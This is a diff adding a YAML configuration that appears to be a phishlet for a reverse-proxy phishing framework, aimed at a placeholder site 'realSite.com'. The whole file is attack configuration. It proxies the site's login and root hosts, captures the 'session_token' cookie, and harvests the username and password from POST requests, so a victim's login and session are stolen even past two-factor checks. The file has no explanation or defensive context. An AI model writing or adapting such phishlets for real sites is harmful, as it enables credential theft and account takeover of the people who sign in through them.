@@ -1,0 +1,22 @@
+author: '@villaroot'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'realSite.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'realSite.com', session: true, is_landing: false}
+sub_filters: []
+auth_tokens:
+  - domain: 'login.realSite.com'
+    keys: ['session_token']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.realSite.com'
+  path: '/dashboard.php'
